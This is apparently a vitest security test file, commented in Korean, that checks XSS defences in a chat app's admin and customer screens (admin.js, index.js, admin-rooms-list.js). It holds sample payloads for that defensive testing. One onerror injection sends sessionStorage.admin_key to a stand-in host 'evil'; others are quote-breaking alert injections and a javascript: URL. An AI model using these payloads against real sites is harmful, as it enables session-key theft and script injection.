/**
 * 보안 점검 PR-1 (2026-11-19) — 화면 쪽 방어. 서버가 막기 전에 이미 저장된 메시지가 있어도 실행되지 않게.
 * 관리자 화면(admin.js·admin-rooms-list.js)과 거래처 화면(index.js)을 실제 파일에서 잘라 실행한다.
 *
 * 2바퀴 검토에서 찾은 것도 같이:
 *  - e() 에 따옴표 이스케이프를 넣으면 e(x).replace(/'/g,'') 로 onclick 에 넣던 15곳이 오히려 뚫림 → e() 는 그대로,
 *    그림·파일 속성만 escAttr
 *  - 사진 묶음(renderPhotoGroupAdmin)이 주소를 onclick 안에 그대로 넣던 것 → JSON + escAttr, 사진 주소 모양을 엄격하게
 */
import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';

function pick(file: string, names: string[], prelude = '') {
  const s = readFileSync(file, 'utf8');
  const parts = names.map((n) => {
    const i = s.indexOf('function ' + n + '(');
    if (i < 0) throw new Error(file + ': ' + n + ' 없음');
    let depth = 0, j = s.indexOf('{', i);
    for (; j < s.length; j++) { if (s[j] === '{') depth++; else if (s[j] === '}' && --depth === 0) break; }
    return s.slice(i, j + 1);
  });
  return new Function(prelude + parts.join('\n') + '\nreturn {' + names.join(',') + '};')();
}

const A = pick('admin.js', ['e', 'escAttr', 'isSafeMediaUrl', 'parseMsg']);
const C = pick('index.js', ['escAttr', 'isSafeMediaUrl', 'parseMessageContent']);
const EVIL_IMG = '[IMG]x"onerror="fetch(\'//evil/\'+sessionStorage.admin_key)';
const EVIL_PARAM = "[IMG]/api/image?k=a&x=');alert(document.domain);//";

describe('관리자 화면 (admin.js)', () => {
  it('e() 는 예전 그대로 (onclick 안에서 따옴표를 지우는 15곳이 깨지지 않게)', () => {
    expect(A.e(`a'b"<>&`)).toBe(`a'b"&lt;&gt;&amp;`);
    expect(A.e(`x');alert(1);//`).replace(/'/g, '')).not.toContain("'");
  });
  it('우리 사진·파일 주소 모양이 아니면 그림·파일로 만들지 않고 글자로', () => {
    for (const bad of [EVIL_IMG, EVIL_PARAM, "[IMG]/api/image?k=a'b"]) {
      const p = A.parseMsg(bad);
      expect(p.image).toBeNull();
      expect(p.text).toBe(bad);
    }
    expect(A.parseMsg('[FILE]{"url":"javascript:alert(1)","name":"a"}').file).toBeNull();
  });
  it('정상 사진·파일(이름에 작은따옴표·괄호 있어도)은 그대로', () => {
    expect(A.parseMsg('[IMG]/api/image?k=u1%2Ffiles%2Fa.jpg\n설명').image).toBe('/api/image?k=u1%2Ffiles%2Fa.jpg');
    expect(A.parseMsg(`[FILE]{"url":"/api/file?k=u1%2Ffiles%2Fa.pdf&name=boss's(final).pdf","name":"boss's(final).pdf"}`).file.name).toBe("boss's(final).pdf");
  });
  it('메시지 그림·파일 속성은 escAttr, 답장 번호는 영문·숫자만', () => {
    const src = readFileSync('admin.js', 'utf8');
    expect(src).toContain(`src="'+escAttr(p.image)+'"`);
    expect(src).toContain(`href="'+escAttr(p.file.url||'#')+'" download="'+escAttr(nm)+'"`);
    expect(src).toContain("ji=String(p.reply.i||'').replace(/[^A-Za-z0-9_-]/g,'')");
  });
});

describe('관리자 상담방 사진 묶음 (admin-rooms-list.js renderPhotoGroupAdmin)', () => {
  const R = pick('admin-rooms-list.js', ['renderPhotoGroupAdmin'],
    readFileSync('admin.js', 'utf8').match(/function e\(t\)\{[^\n]*\}/)![0] + '\n' +
    readFileSync('admin.js', 'utf8').match(/function escAttr\(t\)\{[^\n]*\}/)![0] + '\n');
  it('주소에 따옴표가 섞여 있어도 onclick·src 밖으로 못 나간다', () => {
    const evil = "a');alert(1);//";
    const html = R.renderPhotoGroupAdmin({ role: 'user', name: '갑', created_at: '2026-11-19 10:00:00', _photos: [{ url: evil, msgId: 1 }] });
    const box = document.createElement('div');
    box.innerHTML = html;
    const tile = box.querySelector('[data-kind="img"]') as HTMLElement;
    const onclick = tile.getAttribute('onclick')!;
    expect(onclick).toContain('openImgViewer(' + JSON.stringify(evil) + ',');
    expect(box.querySelector('img')!.getAttribute('src')).toBe(evil);
    expect(box.querySelectorAll('[onerror]').length).toBe(0);
  });
});

describe('거래처 화면 (index.js)', () => {
  it('위조 [IMG] 는 글자로, 정상 사진은 그림으로', () => {
    expect(C.parseMessageContent(EVIL_IMG).image).toBeNull();
    expect(C.parseMessageContent(EVIL_PARAM).image).toBeNull();
    expect(C.parseMessageContent('[IMG]/api/image?k=a.jpg').image).toBe('/api/image?k=a.jpg');
  });
  it('그림·파일 주소와 파일명은 속성용 이스케이프, 사진 묶음 onclick 도, 답장 번호 정리', () => {
    const src = readFileSync('index.js', 'utf8');
    expect(src).toContain(`src="'+escAttr(parsed.image)+'"`);
    expect(src).toContain(`href="'+escAttr(parsed.file.url||'#')+'"`);
    expect(src).toContain(`openImgViewer('+escAttr(JSON.stringify(p.url))+','+escAttr(allUrlsJs)+')`);
    expect(src).toContain(`<img src="'+escAttr(u)+'"`);
    expect(src).toContain("ji=String(parsed.reply.i||'').replace(/[^A-Za-z0-9_-]/g,'')");
    expect(C.escAttr('"x\'')).toBe('&quot;x&#39;');
  });
});
